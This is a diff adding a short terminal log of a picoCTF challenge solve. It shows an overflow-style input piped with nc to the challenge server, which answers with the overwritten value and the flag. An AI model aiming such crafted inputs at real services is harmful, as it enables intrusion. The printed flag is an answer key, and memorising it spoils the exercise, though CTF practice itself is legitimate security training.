@@ -1,0 +1,6 @@
+┌─[cristian@Prestige-13-AI]─[~/Descargas/picoCTF/17/Picker IV]
+└──╼ $ echo "aaaaaaaaaaaaaaaaaaaaaaaaA" | nc saturn.picoctf.net 49948
+Enter a string: 
+num is 65
+You win!
+picoCTF{l0c4l5_1n_5c0p3_ee58441a}
